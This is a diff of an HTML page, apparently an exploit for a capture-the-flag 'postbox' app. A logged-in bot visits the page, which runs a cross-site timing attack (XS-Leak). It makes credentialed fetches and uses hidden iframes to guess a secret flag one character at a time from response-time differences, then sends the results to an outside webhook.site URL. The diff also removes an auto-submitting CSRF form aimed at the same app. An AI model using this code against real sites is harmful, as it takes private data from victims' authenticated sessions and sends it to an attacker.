@@ -1,11 +1,267 @@
 <!doctype html>
-<p id="status">HTML loaded</p>
-<form method="post" action="https://24ad0cec255f215f.postbox.best/compose">
-  <input type="hidden" name="to" value="aaa">
-  <input type="hidden" name="subject" value="from bot">
-  <input type="hidden" name="body" value="hello">
-</form>
+<html lang="vi">
+<meta charset="utf-8">
+<title>Postbox timing probe</title>
+<style>
+  body { font: 14px monospace; padding: 24px; color: #222; }
+</style>
+<body><pre id="status">Đang đo…</pre>
 <script>
-document.getElementById("status").textContent = "JS ran; submitting";
-setTimeout(() => document.forms[0].submit(), 1000);
+"use strict";
+
+const WEBHOOK = "https://webhook.site/6ec1ed3f-8c2e-467b-bf24-2a02c70fa9ba";
+const params = new URLSearchParams(location.search);
+
+const prefix = params.get("p") || "flag{";
+const rid = params.get("rid") || crypto.randomUUID();
+const app = params.get("app") || "https://24ad0cec255f215f.postbox.best";
+const alphabet = [...new Set(
+  params.get("cs") || "}abcdefghijklmnopqrstuvwxyz0123456789_-"
+)];
+const sampleCount = Math.max(1, Math.min(7, Number.parseInt(params.get("n") || "3", 10)));
+const verifyCount = Math.max(1, Math.min(8, Number.parseInt(params.get("v") || "4", 10)));
+const shortlistSize = Math.max(1, Math.min(4, Number.parseInt(params.get("top") || "2", 10)));
+const status = document.getElementById("status");
+
+const median = values => {
+  const sorted = [...values].sort((a, b) => a - b);
+  const mid = Math.floor(sorted.length / 2);
+  return sorted.length % 2
+    ? sorted[mid]
+    : (sorted[mid - 1] + sorted[mid]) / 2;
+};
+
+const deviation = (values, center) =>
+  median(values.map(value => Math.abs(value - center)));
+
+function targetUrl(query) {
+  const url = new URL(app);
+  url.search = "";
+  url.searchParams.set("q", query);
+  url.searchParams.set("sort", "asc");
+  url.searchParams.set("probe", Math.random().toString(36).slice(2));
+  return url.href;
+}
+
+function loadFrame(query) {
+  return new Promise(resolve => {
+    const frame = document.createElement("iframe");
+    frame.style.cssText =
+      "position:absolute;width:2px;height:2px;left:-20px;top:-20px";
+
+    let finished = false;
+    const timer = setTimeout(() => finish(true), 6000);
+
+    function finish(timedOut = false) {
+      if (finished) return;
+      finished = true;
+      clearTimeout(timer);
+
+      let frames = -1;
+      try { frames = frame.contentWindow.length; } catch (_) {}
+
+      frame.remove();
+      resolve({ frames, timedOut });
+    }
+
+    frame.onload = () => finish(false);
+    frame.onerror = () => finish(false);
+    frame.src = targetUrl(query);
+    document.body.appendChild(frame);
+  });
+}
+
+async function load(query) {
+  const started = performance.now();
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), 6000);
+  let timedOut = false;
+
+  try {
+    await fetch(targetUrl(query), {
+      mode: "no-cors",
+      credentials: "include",
+      cache: "no-store",
+      signal: controller.signal
+    });
+  } catch (_) {
+    timedOut = controller.signal.aborted;
+  } finally {
+    clearTimeout(timer);
+  }
+
+  return { ms: performance.now() - started, timedOut };
+}
+
+async function send(data) {
+  const url = new URL(WEBHOOK);
+  const payload = { rid, prefix, ...data };
+
+  for (const [key, value] of Object.entries(payload)) {
+    if (value === undefined || value === null) continue;
+    url.searchParams.set(
+      key,
+      typeof value === "object" ? JSON.stringify(value) : String(value)
+    );
+  }
+  url.searchParams.set("_", String(Date.now()));
+
+  try {
+    await fetch(url.href, {
+      method: "GET",
+      mode: "no-cors",
+      credentials: "omit",
+      cache: "no-store",
+      keepalive: true
+    });
+  } catch (_) {
+    // no-cors response không đọc được; webhook vẫn có thể đã nhận request.
+  }
+}
+
+function topSamples(samples) {
+  return Object.entries(samples)
+    .sort((a, b) => b[1].score - a[1].score)
+    .slice(0, 6)
+    .map(([char, sample]) => ({ char, score: sample.score }));
+}
+
+async function pairedDelta(query, round) {
+  const baselineQuery = prefix + "\u0001";
+  let candidate, baseline;
+
+  if (round % 2 === 0) {
+    candidate = await load(query);
+    baseline = await load(baselineQuery);
+  } else {
+    baseline = await load(baselineQuery);
+    candidate = await load(query);
+  }
+
+  return { delta: baseline.ms - candidate.ms, candidate, baseline };
+}
+
+(async () => {
+  const baselineQuery = prefix + "\u0001";
+  const baselineRuns = [];
+  const samples = {};
+
+  const authCheck = await loadFrame(baselineQuery);
+  if (authCheck.frames === 0) {
+    await send({ error: "report bot không đăng nhập vào app" });
+    status.textContent = "Bot chưa đăng nhập vào app.";
+    return;
+  }
+
+  // Làm nóng đường truyền và ước lượng độ nhiễu.
+  for (let i = 0; i < 4; i++) {
+    const pair = await pairedDelta(baselineQuery, i);
+    if (pair.baseline.timedOut || pair.candidate.timedOut) {
+      await send({ error: "baseline request timeout" });
+      status.textContent = "Baseline timeout.";
+      return;
+    }
+    baselineRuns.push(pair.baseline.ms, pair.candidate.ms);
+  }
+
+  let baseline = median(baselineRuns);
+  let threshold = Math.max(
+    5,
+    baseline * 0.02,
+    deviation(baselineRuns, baseline) * 1.5
+  );
+
+  for (let index = 0; index < alphabet.length; index++) {
+    if (index > 0 && index % 5 === 0) {
+      const refreshed = await load(baselineQuery);
+      if (refreshed.timedOut) {
+        await send({
+          error: "baseline refresh timeout",
+          top: topSamples(samples)
+        });
+        status.textContent = "Baseline refresh timeout.";
+        return;
+      }
+
+      baselineRuns.push(refreshed.ms);
+      const recent = baselineRuns.slice(-8);
+      baseline = median(recent);
+      threshold = Math.max(
+        5,
+        baseline * 0.02,
+        deviation(recent, baseline) * 1.5
+      );
+    }
+
+    const char = alphabet[index];
+    const deltas = [];
+
+    for (let sample = 0; sample < sampleCount; sample++) {
+      const measured = await load(prefix + char);
+      if (measured.timedOut) {
+        await send({
+          error: "candidate request timeout",
+          top: topSamples(samples)
+        });
+        status.textContent = "Candidate timeout.";
+        return;
+      }
+      deltas.push(baseline - measured.ms);
+    }
+
+    samples[char] = { deltas, score: median(deltas) };
+  }
+
+  const ranked = Object.entries(samples)
+    .sort((a, b) => b[1].score - a[1].score);
+  const finalists = ranked.slice(0, Math.min(shortlistSize, ranked.length));
+
+  for (const [char, sample] of finalists) {
+    for (let i = 0; i < verifyCount; i++) {
+      const pair = await pairedDelta(prefix + char, sampleCount + i);
+
+      if (pair.baseline.timedOut || pair.candidate.timedOut) {
+        await send({
+          error: "verification request timeout",
+          top: topSamples(samples)
+        });
+        status.textContent = "Verification timeout.";
+        return;
+      }
+
+      sample.deltas.push(pair.delta);
+    }
+    sample.score = median(sample.deltas);
+  }
+
+  const verified = finalists
+    .filter(([, sample]) =>
+      sample.score >= threshold &&
+      sample.deltas.filter(value => value > threshold * 0.35).length
+        >= Math.ceil(sample.deltas.length * 0.5)
+    )
+    .sort((a, b) => b[1].score - a[1].score);
+
+  let winner = null;
+  if (
+    verified.length &&
+    (verified.length === 1 ||
+      verified[0][1].score - verified[1][1].score >= threshold)
+  ) {
+    winner = verified[0][0];
+  }
+
+  await send({
+    winner: winner || "",
+    baseline,
+    threshold,
+    top: topSamples(samples)
+  });
+
+  status.textContent = winner
+    ? `Đã gửi kết quả cho prefix ${prefix}.`
+    : `Chưa có ký tự rõ ràng cho prefix ${prefix}.`;
+})();
 </script>
+</body>
+</html>
